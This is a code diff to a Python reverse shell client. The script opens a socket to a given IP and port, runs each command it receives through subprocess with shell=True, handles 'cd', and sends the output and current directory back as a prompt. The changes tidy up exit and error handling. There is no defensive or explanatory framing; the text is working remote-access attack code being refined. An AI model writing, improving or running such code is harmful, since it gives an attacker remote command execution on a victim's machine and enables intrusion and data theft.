@@ -1,6 +1,7 @@
 import os
 import socket
 import subprocess
+import sys
 
 
 def start_connexion(ThisIP, ThisPort, ThisMSG):
@@ -21,11 +22,12 @@ if __name__ == '__main__':
     while True:
         try:
             command = currentSocket.recv(1024).decode('latin1')
-            if command and command == "exit":
+            print(command)
+            if command.replace('\n', '') == 'exit':
                 currentSocket.send("\n [-] " + hostname + " Connection closed")
                 currentSocket.close()
-                break
-            elif command and command != "exit":
+                sys.exit(0)
+            else:
                 process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 if command[:2] == 'cd':
                     path = str(command[3:].replace('\n', ''))
@@ -39,8 +41,6 @@ if __name__ == '__main__':
                 args = stdout
                 currentSocket.send(bytes((args.decode('latin1') + str(os.getcwd()) + '> ').encode('latin1')))
 
-            else:
-                currentSocket.send("\n Command error.")
         except:
             currentSocket.close()
-            break
+            sys.exit(1)
